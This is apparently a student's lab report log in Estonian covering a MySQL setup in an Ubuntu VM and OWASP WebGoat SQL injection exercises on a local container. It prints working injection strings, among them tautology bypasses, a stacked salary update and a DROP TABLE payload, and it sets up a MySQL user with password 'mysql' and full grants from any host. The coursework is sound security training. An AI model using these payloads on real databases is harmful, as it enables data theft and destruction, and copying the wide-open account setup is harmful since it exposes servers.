@@ -1,0 +1,163 @@
+==============================================================
+ 2025-10-21  Kordamine: Virtualbox, Lubuntu, mysql, WebGoat  -  I MYSQL
+ Jegor Onoprijuk, ruhm TA-24B
+==============================================================
+kasutaja : jegorkerimov
+masin    : MacBook-Pro-Jegor
+kuupaev  : 17.11.2026 13:32:38
+host     : macOS 26.6.1 (arm64)
+
+##### 1. Virtuaalmasin (VirtualBoxi + Lubuntu asemel: OrbStack Ubuntu 24.04 masin)
+$ orbctl list
+ta24b-lubuntu  running  ubuntu  noble  arm64  1.4 GB  192.168.139.206
+$ lsb_release -a  (masinas)
+Ubuntu 24.04.5 LTS
+$ uname -a  (masinas)
+Linux 7.2.12-orbstack-00394-gbecdd6130068
+
+##### 2. apt update / upgrade / install mysql-server  (tehtud, vt allpool - mysql on paigaldatud)
+$ dpkg -l | grep mysql-server  (masinas)
+
+##### 3. Kontroll: kas mysql toodab?    # service mysql status
+   ● mysql.service - MySQL Community Server
+        Loaded: loaded (/usr/lib/systemd/system/mysql.service; enabled; preset: enabled)
+       Drop-In: /run/systemd/system/service.d
+                └─zzz-lxc-service.conf
+        Active: active (running) since Tue 2026-11-17 13:28:37 EET; 4min 0s ago
+$ ls /etc/mysql  (konf on kaustas /etc/mysql)
+   conf.d
+   debian.cnf
+   debian-start
+   my.cnf
+   my.cnf.fallback
+   mysql.cnf
+   mysql.conf.d
+
+##### 4. Kasutaja:  # mysql  >create user mysql identified by 'mysql'; >grant all on *.* to mysql;
+   user	host	plugin
+   mysql	%	mysql_native_password
+   Grants for mysql@%
+   GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, RELOAD, SHUTDOWN, PROCESS, FILE, REFERENCES, INDEX, ALTER, SHOW DATABASES, SUPER, CREATE TEMPORARY TABLES, LOCK TABLES, EXECUTE, REPLICATION SLAVE, REPLICATION CLIENT, CREATE VIEW, SHOW VIEW, CREATE ROUTINE, ALTER ROUTINE, CREATE USER, EVENT, TRIGGER, CREATE TABLESPACE, CREATE ROLE, DROP ROLE ON *.* TO `mysql`@`%` WITH GRANT OPTION
+   GRANT APPLICATION_PASSWORD_ADMIN,AUDIT_ABORT_EXEMPT,AUDIT_ADMIN,AUTHENTICATION_POLICY_ADMIN,BACKUP_ADMIN,BINLOG_ADMIN,BINLOG_ENCRYPTION_ADMIN,CLONE_ADMIN,CONNECTION_ADMIN,ENCRYPTION_KEY_ADMIN,FIREWALL_EXEMPT,FLUSH_OPTIMIZER_COSTS,FLUSH_STATUS,FLUSH_TABLES,FLUSH_USER_RESOURCES,GROUP_REPLICATION_ADMIN,GROUP_REPLICATION_STREAM,INNODB_REDO_LOG_ARCHIVE,INNODB_REDO_LOG_ENABLE,PASSWORDLESS_USER_ADMIN,PERSIST_RO_VARIABLES_ADMIN,REPLICATION_APPLIER,REPLICATION_SLAVE_ADMIN,RESOURCE_GROUP_ADMIN,RESOURCE_GROUP_USER,ROLE_ADMIN,SENSITIVE_VARIABLES_OBSERVER,SERVICE_CONNECTION_ADMIN,SESSION_VARIABLES_ADMIN,SET_USER_ID,SHOW_ROUTINE,SYSTEM_USER,SYSTEM_VARIABLES_ADMIN,TABLE_ENCRYPTION_ADMIN,TELEMETRY_LOG_ADMIN,XA_RECOVER_ADMIN ON *.* TO `mysql`@`%` WITH GRANT OPTION
+
+##### 5. Host masinast ligipaas (NAT / port forwarding hostiports 3310 -> masina 3306)
+$ grep bind-address /etc/mysql/mysql.conf.d/mysqld.cnf  (masinas)
+   bind-address = 0.0.0.0
+   masina IP: 192.168.139.206
+$ lsof -iTCP:3310 -sTCP:LISTEN -nP    (host kuulab porti 3310)
+   Python     pid 22749  127.0.0.1:3310
+$ mysql -h 127.0.0.1 -P 3310 -u mysql -pmysql  (hostist, pordi 3310 kaudu masinas olevasse MySQL-i)
++----------+-------------------------+----------+---------------+
+| kasutaja | versioon                | server   | masin         |
++----------+-------------------------+----------+---------------+
+| mysql@%  | 8.0.46-0ubuntu0.24.04.5 | (Ubuntu) | ta24b-lubuntu |
++----------+-------------------------+----------+---------------+
+
+##### 6. World database (masinas olevasse MySQL-i), siis script.sql
++-------+-------+-------+
+| riike | linnu | keeli |
++-------+-------+-------+
+|   239 |  4079 |   984 |
++-------+-------+-------+
+
+##### 7. script.sql (opetaja fail) - lahendan hostist, pordi 3310 kaudu
+   tulemusi (ridu valjundis):    17478
+$ select code, name, headofstate from country where code='EST'  (parast update-i Alar Karis)
++------+---------------+----------------+
+| code | name          | headofstate    |
++------+---------------+----------------+
+| ALI  | Aliens colony | Üllar Lindmaa  |
+| EST  | Estonia       | Alar Karis     |
++------+---------------+----------------+
+$ lisatud koloonia:
++---------------+------+--------+------------+
+| riik          | code | linn   | population |
++---------------+------+--------+------------+
+| Aliens colony | ALI  | Colony |        123 |
++---------------+------+--------+------------+
+$ mitu riiki on mingil kontinendil ja mitu inimest seal elab
++---------------+-------+------------+
+| continent     | riike | inimesi    |
++---------------+-------+------------+
+| Asia          |    51 | 3705025700 |
+| Africa        |    58 |  784475000 |
+| Europe        |    47 |  730074723 |
+| North America |    37 |  482993000 |
+| South America |    14 |  345780000 |
+| Oceania       |    28 |   30401150 |
+| Antarctica    |     5 |          0 |
++---------------+-------+------------+
+
+##### II WEBGOAT (OWASP) - SQL injection
+$ docker run --name webgoat -it -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 webgoat/webgoat
+   (jooksutatud -d ehk taustal; docker on OrbStack-is, mitte masina sees - vt README)
+$ docker ps --filter name=webgoat
+   NAMES     IMAGE             STATUS                     PORTS
+   webgoat   webgoat/webgoat   Up 5 minutes (unhealthy)   127.0.0.1:8080->8080/tcp, 127.0.0.1:9090->9090/tcp
+$ lsof -iTCP -sTCP:LISTEN -nP | grep -E ':8080|:9090'
+   OrbStack     pid 4206   127.0.0.1:9090
+   OrbStack     pid 4206   127.0.0.1:8080
+$ curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/WebGoat/login   ->  200
+
+$ python3 webgoat_sql.py     (registreerimine + SQL injection ulesanded)
+==============================================================================
+WEBGOAT - SQL INJECTION (intro)
+Jegor Onoprijuk, ruhm TA-24B
+==============================================================================
+sisse logitud kasutajana: jegoronoprijuk  (WebGoat 127.0.0.1:8080, konteiner 'webgoat')
+
+enne  : 0 / 9 ulesannet lahendatud
+
+2. SELECT osakond (Bob Franco)
+   saadetud : select department from employees where first_name='Bob' and last_name='Fran
+   tulemus  : OK  You have succeeded!
+
+3. UPDATE osakond (Tobi Barnett)
+   saadetud : update employees set department='Sales' where first_name='Tobi' and last_na
+   tulemus  : OK  Congratulations. You have successfully completed the assignment.
+
+4. ALTER TABLE - uus veerg
+   saadetud : alter table employees add column phone varchar(20)
+   tulemus  : OK  Congratulations. You have successfully completed the assignment.
+
+5. GRANT oigus (tabel grant_rights)
+   saadetud : grant all on grant_rights to unauthorized_user
+   tulemus  : OK  Congratulations. You have successfully completed the assignment.
+
+5a. SQL injection: ' OR '1'='1
+   saadetud : '1' = '1
+   tulemus  : OK  You have succeeded:  USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE,
+
+5b. numbriline injection: 1 or 1=1
+   saadetud : 1
+   tulemus  : OK  You have succeeded:  USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE,
+
+8. stringi injection (kogu tabel)
+   saadetud : 3SL99A' or '1'='1
+   tulemus  : OK  You have succeeded! You successfully compromised the confidentiality of data by
+
+9. ahelpaarimine: palk muutmine
+   saadetud : 3SL99A'; update employees set salary=90000 where last_name='Smith'; --
+   tulemus  : OK  Well done! Now you are earning the most money. And at the same time you successf
+
+10. DROP TABLE access_log
+   saadetud : a'; drop table access_log; --
+   tulemus  : OK  Success! You successfully deleted the access_log table and that way compromised
+
+------------------------------------------------------------------------------
+LESSON OVERVIEW (WebGoat poolt kinnitatud):
+   SqlInjectionLesson10    lahendatud
+   SqlInjectionLesson2     lahendatud
+   SqlInjectionLesson3     lahendatud
+   SqlInjectionLesson4     lahendatud
+   SqlInjectionLesson5     lahendatud
+   SqlInjectionLesson5a    lahendatud
+   SqlInjectionLesson5b    lahendatud
+   SqlInjectionLesson8     lahendatud
+   SqlInjectionLesson9     lahendatud
+
+kokku: 9 / 9 lahendatud
+
+==============================================================
+Too tegi: Jegor Onoprijuk (jegorkerimov@MacBook-Pro-Jegor), TA-24B
+==============================================================
